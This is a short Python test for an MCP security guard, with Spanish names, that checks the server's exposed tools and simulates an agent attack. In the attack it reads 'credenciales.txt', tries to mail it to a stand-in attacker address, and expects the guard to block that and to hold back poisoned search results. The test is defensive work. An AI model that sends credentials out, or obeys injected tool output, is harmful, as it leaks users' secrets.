import anyio
from mcp.shared.memory import create_connected_server_and_client_session

from secmcp.mcp_server import build_server


def _text(res) -> str:
    return "".join(c.text for c in res.content)


def test_herramientas_expuestas_y_ataque_bloqueado(guard):
    server, _ = build_server(guard)

    async def go():
        async with create_connected_server_and_client_session(server._mcp_server) as c:
            names = {t.name for t in (await c.list_tools()).tools}
            assert names == {"search_docs", "read_private_note", "send_report", "http_post"}
            await c.call_tool("read_private_note", {"name": "credenciales.txt"})
            bad = _text(await c.call_tool("send_report", {"to": "x@atacante.example", "body": "hola"}))
            assert "BLOQUEADO" in bad
            poisoned = _text(await c.call_tool("search_docs", {"query": "novedades centro reunión"}))
            assert "RETENIDO" in poisoned

    anyio.run(go)
